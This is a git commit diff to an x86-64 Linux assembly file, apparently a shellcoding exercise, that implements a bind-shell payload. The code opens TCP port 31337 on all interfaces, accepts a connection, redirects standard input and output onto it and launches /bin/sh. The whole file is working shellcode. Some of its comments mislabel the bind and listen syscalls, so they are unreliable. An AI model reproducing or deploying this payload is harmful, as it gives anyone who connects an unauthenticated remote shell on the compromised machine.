8937aad0f7602c8590139a329af98d0015c7bb05
luschneider <schneider.lukas-games@hotmail.de>
2016-09-02 21:30:39 +0200

    Update Bind-TCP-shellcode.s

--- Bind-TCP-shellcode.s
+++ Bind-TCP-shellcode.s
@@ -6,30 +6,31 @@ section .text
 _start:
 	; socket(AF_INET, SOCK_STREAM, 0) -> C
 	push BYTE 0x29				; sys_socket systemcall
-	pop rax						; is number 41 (0x29)
+	pop rax					; is number 41 (0x29)
 	push BYTE 0x2
-	pop rdi						; IP protocol family
+	pop rdi					; IP protocol family
 	push BYTE 0x1
-	pop rsi						; stream socket
-	cdq							; no protocol
+	pop rsi					; stream socket
+	cdq					; default protocol
 	syscall
 
-	mov rdi,rax					; save and store socket fd in rdi for reuse
+	mov rdi,rax				; save and store socket fd in rdi for reuse
 
 	; bind(s, [2, 31337, 0], 16)
 	push BYTE 0x31				; sys_listen systemcall
-	pop rax						; is number 49 (0x31)
-	push rdx					; 00000000 00000000
-	mov WORD [rsp+2], 0x697a	; 697a0000 00000000 ..
-	mov BYTE [rsp], 0x2			; 697a0002 00000000 ..
-	push rsp					; pointer to
-	pop rsi						; sockaddr structure
+	pop rax					; is number 49 (0x31)
+	xor rdx,rdx
+	push rdx				; SIN_ADDR = ANY
+	mov WORD [rsp+2], 0x697a		; PORT = 31337 (0x697a)
+	mov BYTE [rsp], 0x2			; FAMILY = AF_INET (2)
+	push rsp				; pointer to
+	pop rsi					; sockaddr structure
 	mov BYTE dl,0x10			; addrlen = 16
 	syscall
 
 	; listen(s, 4)
 	push 0x32
-	pop rax						; sys_bind systemcall is number 50 (0x32)
+	pop rax					; sys_bind systemcall is number 50 (0x32)
 	mov sil, 0x4				; backlog = 4
 	syscall
 
@@ -37,11 +38,11 @@ _start:
 	mov BYTE al, 0x2b			; sys_accept systemcall is 43 (0x2B)
 	xor rsi,rsi
 	xor rdx,rdx
-	syscall						; returns the connected socket fd
+	syscall					; returns the connected socket fd
 
-	;dup2(s, fd)
-	mov rdi,rax					; fp to connected socket
-	xor rax,rax					; clear rax
+	;dup2(s, fd) for stdin, stdout and stderr
+	mov rdi,rax				; fp to connected socket
+	xor rax,rax
 	push 0x3
 	pop rsi	
 	
@@ -54,12 +55,12 @@ dup_loop:
 
 	;execve("/bin/sh", 0, 0)
 	push 0x3b
-	pop rax						; sys_execve
+	pop rax					; sys_execve
 	xor rsi,rsi
 	xor rdx,rdx
-	mov rdi, 0x68732f6e69622f2f	; "hs/nib//"
+	mov rdi, 0x68732f6e69622f2f		; "hs/nib//"
 	shr rdi, 0x8				; "\0hs/nib/"
 	push rdi
 	push rsp
-	pop rdi						; pointer to "/bin/sh"
+	pop rdi					; pointer to "/bin/sh"
 	syscall
